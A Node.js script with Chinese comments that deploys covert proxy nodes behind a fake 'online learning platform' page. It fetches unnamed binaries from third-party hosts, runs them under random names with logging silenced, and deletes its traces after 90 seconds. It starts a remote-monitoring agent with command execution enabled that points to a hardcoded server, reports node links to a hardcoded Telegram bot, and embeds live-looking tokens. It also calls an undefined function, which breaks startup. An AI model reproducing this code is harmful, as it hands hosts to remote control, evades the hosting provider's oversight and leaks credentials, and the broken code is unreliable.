const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');

// ----------------------------------------------------------------------------------------------------
// 环境变量配置区
// ----------------------------------------------------------------------------------------------------

// 只填写UPLOAD_URL将上传节点,同时填写UPLOAD_URL和PROJECT_URL将上传订阅
const UPLOAD_URL = process.env.UPLOAD_URL || '';        // 节点或订阅自动上传地址
const PROJECT_URL = process.env.PROJECT_URL || '';      // 需要上传订阅或保活时需填写项目分配的url
const AUTO_ACCESS = process.env.AUTO_ACCESS === 'true' || false; // false关闭自动保活，true开启
const FILE_PATH = process.env.FILE_PATH || './tmp';     // 运行目录
const SUB_PATH = process.env.SUB_PATH || '123';         // 订阅路径
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;         // http服务订阅端口
const UUID = process.env.UUID || 'aa512b6d-a9ac-4327-8090-6f3569f8c8bf'; // UUID
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nezha.ylm52.dpdns.org:443'; // 哪吒服务器地址
const NEZHA_PORT = process.env.NEZHA_PORT || '';             // 使用哪吒v1请留空，哪吒v0需填写
const NEZHA_KEY = process.env.NEZHA_KEY || 'ricZCX8ODNyN0X4UlSRSnZ9l92zn4UDB';                // 哪吒密钥
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'pl.oocoo.ggff.net';            // 固定隧道域名
const ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiYTIyMGI2MDFlMmJlYWE0ODQzNWRkZjAyMjllYjg1YmUiLCJ0IjoiODczMDQ4YzItODJlZC00MDUxLWE2MjUtMWVlMGVhMzBjNWNmIiwicyI6Ik5UTTVNV1U1WWpJdE9ETXhNQzAwTW1VeUxXRmhaVEF0TTJVM01qWmlObVF5TURjMiJ9';                // 固定隧道密钥
const ARGO_PORT = process.env.ARGO_PORT || 8001;             // 固定隧道端口
const CFIP = process.env.CFIP || 'cf.877774.xyz';         // 节点优选域名或优选ip 
const CFPORT = process.env.CFPORT || 443;                     // 节点优选域名或优选ip对应的端口
const NAME = process.env.NAME || 'pluox';                          // 节点名称
const XIEYI = process.env.XIEYI || '2';                          // 协议选择
const CHAT_ID = process.env.CHAT_ID || '2117746804';                     // Telegram chat_id
const BOT_TOKEN = process.env.BOT_TOKEN || '5279043230:AAFI4qfyo0oP7HJ-39jLqjqq9Wh6OeWrTjw';                 // Telegram bot_token

// ----------------------------------------------------------------------------------------------------
// 初始化与工具函数
// ----------------------------------------------------------------------------------------------------

// 创建运行文件夹
if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

// 生成随机6位字符文件名
function generateRandomName() {
  const characters = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

// 全局常量
const npmName = generateRandomName();
const webName = generateRandomName();
const botName = generateRandomName();
const phpName = generateRandomName();
let npmPath = path.join(FILE_PATH, npmName);
let phpPath = path.join(FILE_PATH, phpName);
let webPath = path.join(FILE_PATH, webName);
let botPath = path.join(FILE_PATH, botName);
let subPath = path.join(FILE_PATH, 'sub.txt');
let listPath = path.join(FILE_PATH, 'list.txt');
let bootLogPath = path.join(FILE_PATH, 'boot.log');
let configPath = path.join(FILE_PATH, 'config.json');

// 如果订阅器上存在历史运行节点则先删除
async function deleteNodes() {
  try {
    if (!UPLOAD_URL) return;
    if (!fs.existsSync(subPath)) return;

    let fileContent;
    try {
      fileContent = fs.readFileSync(subPath, 'utf-8');
    } catch {
      return;
    }

    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line => 
      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line.trim())
    );

    if (nodes.length === 0) return;

    try {
      await axios.post(`${UPLOAD_URL}/api/delete-nodes`, 
        { nodes },
        { headers: { 'Content-Type': 'application/json' } }
      );
      console.log(`Deleted ${nodes.length} nodes from server`);
    } catch (error) {
      console.warn('Failed to delete nodes:', error.message);
    }
  } catch (err) {
    console.error('Error in deleteNodes:', err.message);
  }
}

// 清理历史文件 (兼容 Windows 和 Linux)
function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, webPath, botPath];
    
    if (NEZHA_PORT) {
      filesToDelete.push(npmPath);
    } else if (NEZHA_SERVER && NEZHA_KEY) {
      filesToDelete.push(phpPath);
    }

    const platform = os.platform();
    let command = '';

    if (platform === 'win32') {
      command = `del /f /q "${filesToDelete.join('" "')}" >nul 2>&1`;
    } else {
      command = `rm -f ${filesToDelete.join(' ')} >/dev/null 2>&1`;
    }

    exec(command, (error) => {
      console.clear();
      console.log('App is running');
      console.log('Thank you for using this script, enjoy!');
    });
  }, 90000); // 90s
}

// ----------------------------------------------------------------------------------------------------
// 路由设置 (含伪装页面)
// ----------------------------------------------------------------------------------------------------

// 根路由 - 伪装成在线学习平台页面
app.get("/", function(req, res) {
  const html = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>知识云课堂 - 在线学习平台</title>
    <style>
        body { font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif; background-color: #f5f8ff; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; color: #333; }
        .header-title { font-size: 24px; font-weight: bold; color: #555; margin-bottom: 30px; text-align: center; display: flex; align-items: center; gap: 10px; }
        .banner { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 20px; padding: 40px; text-align: center; max-width: 800px; width: 90%; margin-bottom: 50px; box-shadow: 0 4px 20px rgba(102, 126, 234, 0.3); }
        .banner h1 { color: #ffffff; margin: 0 0 15px 0; font-size: 32px; letter-spacing: 1px; }
        .banner p { color: #f0f0f0; margin: 0; font-size: 18px; }
        .grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 25px; max-width: 1000px; width: 95%; justify-content: center; }
        .card { background-color: #ffffff; border-radius: 15px; padding: 25px 20px; text-align: center; transition: all 0.3s ease; box-shadow: 0 2px 8px rgba(0,0,0,0.08); border: 1px solid #e8ecf4; }
        .card:hover { transform: translateY(-5px); box-shadow: 0 8px 20px rgba(102, 126, 234, 0.2); border-color: #667eea; }
        .icon { font-size: 48px; margin-bottom: 15px; display: inline-block; }
        .card h3 { color: #667eea; margin: 10px 0; font-size: 18px; font-weight: bold; }
        .card p { color: #777; font-size: 14px; line-height: 1.6; margin: 0; }
    </style>
</head>
<body>
    <div class="header-title"><span style="font-size: 32px;">📚</span>知识云课堂 - 让学习更简单<span style="font-size: 32px;">🎓</span></div>
    <div class="banner"><h1>探索知识的海洋，成就更好的自己</h1><p>海量优质课程，随时随地在线学习</p></div>
    <div class="grid-container">
        <div class="card"><div class="icon">💻</div><h3>编程开发</h3><p>Python、Java、前端等热门技术课程</p></div>
        <div class="card"><div class="icon">🎨</div><h3>设计创意</h3><p>UI设计、平面设计、视频剪辑</p></div>
        <div class="card"><div class="icon">🌐</div><h3>语言学习</h3><p>英语、日语、法语等多语种课程</p></div>
        <div class="card"><div class="icon">📊</div><h3>数据分析</h3><p>大数据、数据可视化、AI应用</p></div>
        <div class="card"><div class="icon">📱</div><h3>移动开发</h3><p>iOS、Android、跨平台开发</p></div>
        <div class="card"><div class="icon">💼</div><h3>职场技能</h3><p>办公软件、项目管理、沟通技巧</p></div>
    </div>
</body>
</html>
  `;
  res.set('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

// ----------------------------------------------------------------------------------------------------
// 核心逻辑功能
// ----------------------------------------------------------------------------------------------------

// 生成xr-ay配置文件
async function generateConfig() {
  const config = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
  };
  fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));
}

// 判断系统架构
function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

// 下载对应系统架构的依赖文件
function downloadFile(fileName, fileUrl, callback) {
  const filePath = fileName; 
  
  // 确保目录存在
  if (!fs.existsSync(FILE_PATH)) {
    fs.mkdirSync(FILE_PATH, { recursive: true });
  }
  
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        console.log(`Download ${path.basename(filePath)} successfully`);
        callback(null, filePath);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
        console.error(errorMessage);
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
      console.error(errorMessage); 
      callback(errorMessage);
    });
}

// 下载并运行依赖文件
async function downloadFilesAndRun() { 
  
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, filePath) => {
        if (err) {
          reject(err);
        } else {
          resolve(filePath);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises);
  } catch (err) {
    console.error('Error downloading files:', err);
    return;
  }
  // 授权和运行
  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;
    filePaths.forEach(absoluteFilePath => {
      if (fs.existsSync(absoluteFilePath)) {
        fs.chmod(absoluteFilePath, newPermissions, (err) => {
          if (err) {
            console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
          } else {
            console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
          }
        });
      }
    });
  }
  const filesToAuthorize = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath];
  authorizeFiles(filesToAuthorize);

  //运行ne-zha
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      // 检测哪吒是否开启TLS
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
      // 生成 config.yaml
      const configYaml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;
      
      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
      
      // 运行 v1
      const command = `nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log(`${phpName} is running`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`php running error: ${error}`);
      }
    } else {
      let NEZHA_TLS = '';
      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
      if (tlsPorts.includes(NEZHA_PORT)) {
        NEZHA_TLS = '--tls';
      }
      const command = `nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log(`${npmName} is running`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`npm running error: ${error}`);
      }
    }
  } else {
    console.log('NEZHA variable is empty,skip running');
  }
  //运行xr-ay
  const command1 = `nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;
  try {
    await exec(command1);
    console.log(`${webName} is running`);
    await new Promise((resolve) => setTimeout(resolve, 1000));
  } catch (error) {
    console.error(`web running error: ${error}`);
  }

  // 运行cloud-fared
  if (fs.existsSync(botPath)) {
    let args;

    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
    }

    try {
      await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
      console.log(`${botName} is running`);
      await new Promise((resolve) => setTimeout(resolve, 2000));
    } catch (error) {
      console.error(`Error executing command: ${error}`);
    }
  }
  await new Promise((resolve) => setTimeout(resolve, 5000));

}

//根据系统架构返回对应的url
function getFilesForArchitecture(architecture) {
  let baseFiles;
  if (architecture === 'arm') {
    baseFiles = [
      { fileName: webPath, fileUrl: "https://arm64.ssss.nyc.mn/web" },
      { fileName: botPath, fileUrl: "https://arm64.ssss.nyc.mn/bot" }
    ];
  } else {
    baseFiles = [
      { fileName: webPath, fileUrl: "https://amd64.ssss.nyc.mn/web" },
      { fileName: botPath, fileUrl: "https://amd64.ssss.nyc.mn/bot" }
    ];
  }

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const npmUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/agent"
        : "https://amd64.ssss.nyc.mn/agent";
        baseFiles.unshift({ 
          fileName: npmPath, 
          fileUrl: npmUrl 
        });
    } else {
      const phpUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/v1" 
        : "https://amd64.ssss.nyc.mn/v1";
      baseFiles.unshift({ 
        fileName: phpPath, 
        fileUrl: phpUrl
      });
    }
  }

  return baseFiles;
}

// 获取固定隧道json
function argoType() {
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console.log("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels");
    return;
  }

  if (ARGO_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
    const tunnelYaml = `
  tunnel: ${ARGO_AUTH.split('"')[11]}
  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
  protocol: http2
   
  ingress:
    - hostname: ${ARGO_DOMAIN}
      service: http://localhost:${ARGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  } else {
    console.log("ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel");
  }
}
argoType();

// 获取临时隧道domain
async function extractDomains() {
  let argoDomain;

  if (ARGO_AUTH && ARGO_DOMAIN) {
    argoDomain = ARGO_DOMAIN;
    console.log('ARGO_DOMAIN:', argoDomain);
    await generateLinks(argoDomain);
  } else {
    try {
      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');
      const lines = fileContent.split('\n');
      const argoDomains = [];
      lines.forEach((line) => {
        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (domainMatch) {
          const domain = domainMatch[1];
          argoDomains.push(domain);
        }
      });

      if (argoDomains.length > 0) {
        argoDomain = argoDomains[0];
        console.log('ArgoDomain:', argoDomain);
        await generateLinks(argoDomain);
      } else {
        console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');
        // 删除 boot.log 文件，等待 2s 重新运行 server 以获取 ArgoDomain
        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
        // 停止 bot 进程
        try {
          await exec(`pkill -f "${botName}" > /dev/null 2>&1`);
        } catch (error) {
          // 忽略输出
        }
        await new Promise((resolve) => setTimeout(resolve, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
        try {
          await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
          console.log(`${botName} is running`);
          await new Promise((resolve) => setTimeout(resolve, 3000));
          await extractDomains(); // 重新提取域名
        } catch (error) {
          console.error(`Error executing command: ${error}`);
        }
      }
    } catch (error) {
      console.error('Error reading boot.log:', error);
    }
  }
}


// 国家代码到国旗 Emoji 的映射函数
function getFlagEmoji(countryCode) {
    if (!countryCode) return '';
    const base = 0x1F1E6; // '🇦' 的基数
    const codePoints = countryCode.toUpperCase().split('').map(char => base + char.charCodeAt(0) - 'A'.charCodeAt(0));
    try {
        return String.fromCodePoint(...codePoints);
    } catch (e) {
        return '';
    }
}

// 国家代码到中文名称映射表
const countryMap = {
  // 亚洲
  CN: '中国', HK: '中国香港', MO: '中国澳门', TW: '中国台湾', JP: '日本', KR: '韩国', SG: '新加坡', MY: '马来西亚', TH: '泰国', VN: '越南', PH: '菲律宾', ID: '印度尼西亚', IN: '印度', PK: '巴基斯坦', BD: '孟加拉国', AE: '阿联酋', SA: '沙特阿拉伯', IL: '以色列', TR: '土耳其', QA: '卡塔尔', KW: '科威特', BH: '巴林', OM: '阿曼', JO: '约旦', LB: '黎巴嫩', IQ: '伊拉克', IR: '伊朗', SY: '叙利亚', YE: '也门', TM: '土库曼斯坦', TJ: '塔吉克斯坦', KG: '吉尔吉斯斯坦', UZ: '乌兹别克斯坦', LA: '老挝', KH: '柬埔寨', MM: '缅甸', BN: '文莱',
  // 欧洲
  RU: '俄罗斯', UA: '乌克兰', BY: '白俄罗斯', KZ: '哈萨克斯坦', GE: '格鲁吉亚', AZ: '阿塞拜疆', AM: '亚美尼亚', DE: '德国', FR: '法国', GB: '英国', NL: '荷兰', BE: '比利时', LU: '卢森堡', CH: '瑞士', AT: '奥地利', IT: '意大利', ES: '西班牙', PT: '葡萄牙', IE: '爱尔兰', DK: '丹麦', NO: '挪威', SE: '瑞典', FI: '芬兰', IS: '冰岛', PL: '波兰', CZ: '捷克', SK: '斯洛伐克', HU: '匈牙利', RO: '罗马尼亚', BG: '保加利亚', GR: '希腊', RS: '塞尔维亚', HR: '克罗地亚', SI: '斯洛文尼亚', LT: '立陶宛', LV: '拉脱维亚', EE: '爱沙尼亚', CY: '塞浦路斯', MT: '马耳他', LI: '列支敦士登', MC: '摩纳哥', SM: '圣马力诺', MD: '摩尔多瓦', AL: '阿尔巴尼亚', MK: '北马其顿', BA: '波黑', ME: '黑山', XK: '科索沃',
  // 北美
  US: '美国', CA: '加拿大', MX: '墨西哥', CR: '哥斯达黎加', PA: '巴拿马', GT: '危地马拉', CU: '古巴', DO: '多米尼加', JM: '牙买加', TT: '特立尼达和多巴哥', PR: '波多黎各', GU: '关岛', KY: '开曼群岛',
  // 南美
  BR: '巴西', AR: '阿根廷', CL: '智利', CO: '哥伦比亚', PE: '秘鲁', UY: '乌拉圭', VE: '委内瑞拉', EC: '厄瓜多尔', BO: '玻利维亚', PY: '巴拉圭', SR: '苏里南',
  // 非洲
  ZA: '南非', EG: '埃及', NG: '尼日利亚', KE: '肯尼亚', MA: '摩洛哥', DZ: '阿尔及利亚', TN: '突尼斯', LY: '利比亚', SD: '苏丹', ET: '埃塞俄比亚', TZ: '坦桑尼亚', UG: '乌干达', GH: '加纳', CI: '科特迪瓦', SN: '塞内加尔', CM: '喀麦隆', MZ: '莫桑比克', AO: '安哥拉',
  // 大洋洲 / 太平洋
  AU: '澳大利亚', NZ: '新西兰', FJ: '斐济', PG: '巴布亚新几内亚', TO: '汤加', WS: '萨摩亚',
  // 其他地区
  IM: '曼岛', GG: '根西岛', JE: '泽西岛',
  // 默认
  UN: '未知地区'
};

function getCountryName(code) {
  return countryMap[code] || code || '未知地区'; // 如果找不到中文，优先返回代码本身，最后才返回未知
}

// ----------------------------------------------------------------------------------------------------
// 【优化版】生成节点链接函数 (直接获取国家代码 + 中文转换)
// ----------------------------------------------------------------------------------------------------
async function generateLinks(argoDomain) {
    let countryCode = 'UN'; 

    try {
        const response = await axios.get('https://speed.cloudflare.com/meta', { timeout: 5000 });
        if (response.data && response.data.country) {
            countryCode = response.data.country;
        }
    } catch (err) {
        console.log('Failed to fetch location info, using default (UN)');
    }

    // 获取国旗 Emoji 
    const flagEmoji = getFlagEmoji(countryCode);
    
    // 获取中文国家名称
    const countryName = getCountryName(countryCode);

    // 构建节点名称: [国旗] [Name]-[中文国家名]
    const baseNodeName = NAME ? `${NAME}-${countryName}` : countryName;
    const nodeName = `${flagEmoji} ${baseNodeName}`.trim();

    return new Promise(async (resolve) => {
      setTimeout(async () => {
        const VMESS = { v: '2', ps: `${nodeName}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox'};
        
        let subTxt = '';
        
        // --- 协议选择逻辑 ---
        if (XIEYI === '3') {
          subTxt = `
vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}-VLESS
  
vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
  
trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}-TROJAN
    `;
        } else if (XIEYI === '2') {
          subTxt = `
vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}-VLESS
  
vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
    `;
        } else {
          subTxt = `vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}`;
        }

        console.log(Buffer.from(subTxt).toString('base64'));
        fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
        console.log(`${FILE_PATH}/sub.txt saved successfully`);
        
        await uploadNodes();
        await sendToTelegram(subTxt.trim(), nodeName);
        
        if (!app._router.stack.some(layer => layer.route && layer.route.path === `/${SUB_PATH}`)) {
           app.get(`/${SUB_PATH}`, (req, res) => {
             const encodedContent = Buffer.from(subTxt).toString('base64');
             res.set('Content-Type', 'text/plain; charset=utf-8');
             res.send(encodedContent);
           });
        }
        
        resolve(subTxt);
      }, 2000);
    });
}

// 推送节点到Telegram
async function sendToTelegram(subTxt, nodeName) {
  if (!CHAT_ID || !BOT_TOKEN) {
    console.log('Telegram推送未配置：CHAT_ID 或 BOT_TOKEN 为空');
    return;
  }

  try {
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const message = `🔗 新节点已生成\n\n节点名称：${nodeName}\n\n订阅链接：\n\`\`\`\n${subTxt.trim()}\n\`\`\``;

    const response = await axios.post(telegramApiUrl, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    if (response && response.status === 200) {
      console.log('节点已推送到Telegram');
      return response;
    } else {
      console.warn('Telegram推送失败：未知响应状态');
      return null;
    }
  } catch (error) {
    if (error.response) {
      console.error('Telegram推送失败:', error.response.data);
    } else {
      console.error('Telegram推送失败:', error.message);
    }
    return null;
  }
}

// 自动上传节点或订阅
async function uploadNodes() {
  if (UPLOAD_URL && PROJECT_URL) {
    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
    const jsonData = {
      subscription: [subscriptionUrl]
    };
    try {
        const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (response && response.status === 200) {
            console.log('Subscription uploaded successfully');
            return response;
        } else {
            return null;
        }
    } catch (error) {
        if (error.response) {
            if (error.response.status === 400) {
              //  console.error('Subscription already exists');
            }
        }
    }
  } else if (UPLOAD_URL) {
      if (!fs.existsSync(listPath)) return;
      const content = fs.readFileSync(listPath, 'utf-8');
      const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));

      if (nodes.length === 0) return;

      const jsonData = JSON.stringify({ nodes });

      try {
          const response = await axios.post(`${UPLOAD_URL}/api/add-nodes`, jsonData, {
              headers: { 'Content-Type': 'application/json' }
          });
          if (response && response.status === 200) {
            console.log('Nodes uploaded successfully');
            return response;
        } else {
            return null;
        }
      } catch (error) {
          return null;
      }
  } else {
      // console.log('Skipping upload nodes');
      return;
  }
}

// 90s后删除相关文件
function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, webPath, botPath];  
    
    if (NEZHA_PORT) {
      filesToDelete.push(npmPath);
    } else if (NEZHA_SERVER && NEZHA_KEY) {
      filesToDelete.push(phpPath);
    }

    const platform = os.platform();
    let command = '';

    if (platform === 'win32') {
      command = `del /f /q "${filesToDelete.join('" "')}" >nul 2>&1`;
    } else {
      command = `rm -f ${filesToDelete.join(' ')} >/dev/null 2>&1`;
    }

    exec(command, (error) => {
      console.clear();
      console.log('App is running');
      console.log('Thank you for using this script, enjoy!');
    });
  }, 90000); // 90s
}
cleanFiles();

// 自动访问项目URL
async function AddVisitTask() {
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console.log("Skipping adding automatic access task");
    return;
  }

  try {
    const response = await axios.post('https://oooo.serv00.net/add-url', {
      url: PROJECT_URL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    // console.log(`${JSON.stringify(response.data)}`);
    console.log(`automatic access task added successfully`);
    return response;
  } catch (error) {
    console.error(`Add automatic access task faild: ${error.message}`);
    return null;
  }
}

// 主运行逻辑
async function startserver() {
  try {
    await deleteNodes(); // 确保删除节点操作完成
    cleanupOldFiles();
    await generateConfig();
    await downloadFilesAndRun();
    await extractDomains();
    await AddVisitTask();
  } catch (error) {
    console.error('Error in startserver:', error);
  }
}
startserver().catch(error => {
  console.error('Unhandled error in startserver:', error);
});

app.listen(PORT, () => console.log(`http server is running on port:${PORT}!`));
